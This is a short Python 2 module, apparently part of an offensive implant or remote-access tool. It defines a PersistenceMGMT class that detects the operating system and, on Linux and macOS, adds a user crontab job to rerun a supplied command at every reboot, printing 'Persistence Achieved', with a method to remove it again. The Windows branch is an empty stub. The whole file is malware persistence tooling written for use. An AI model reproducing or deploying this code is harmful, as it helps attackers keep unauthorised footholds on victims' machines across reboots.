import platform
from getpass import getuser
from crontab import CronTab



class PersistenceMGMT(object):
    def __init__(self):
        self.method = self.get_os()

    def get_os(self):
        system = platform.system()

        if system == "Windows":
            return self.windows
        elif system == "Linux":
            return self.linux
        elif system == "Darwin":
            print "[*] Darwin detected"
            return self.darwin

    def windows(self, delete=False):
        pass

    def darwin(self, command, delete=False):
        self.linux(command, delete)


    def linux(self, command, delete=False):
        user = getuser()
        cron = CronTab(user=user)
        try:
            job = next(cron.find_command(command))
        except StopIteration, e:
            job = False
        if not delete and not job:
            job = cron.new(command=command)
            job.every_reboot()
            print "[+] Persistence Achieved"
        elif delete:
            job = next(cron.find_command(command))
            cron.remove(job)
            print "[-] Persistance Removed"
        cron.write_to_user(user=user)

    def persist(self, arg):
        self.method(arg)

    def desist(self, arg):
        self.method(arg, delete=True)
